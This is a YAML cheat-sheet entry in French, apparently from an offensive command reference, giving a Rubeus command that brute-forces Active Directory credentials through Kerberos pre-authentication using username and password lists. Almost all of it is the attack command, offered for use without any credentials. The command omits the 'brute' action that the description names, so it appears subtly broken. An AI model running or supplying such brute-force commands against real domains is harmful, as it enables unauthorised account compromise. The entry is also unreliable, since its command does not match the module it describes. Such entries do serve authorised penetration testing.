---
description: |
  Le module `brute` de Rubeus permet de forcer brutalement et d'énumérer les comptes Active Directory valides grâce à la préauthentification Kerberos. La commande suivante tente de forcer des identifiants et des mots de passe valides à partir d'une liste d'identifiants et de mots de passe.

  Command Reference:

  	Domain: test.local

  	Username List: usernames.txt

  	Password List: passwords.txt

  	Output File: found_passwords.txt
command: |
  Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt
items:
  - No_Creds
services:
  - Kerberos
OS:
  - Windows
  - Approved-tool
attack_types:
  - Enumeration
references:
  - https://github.com/GhostPack/Rubeus
  - https://github.com/GhostPack/Rubeus#brute
---
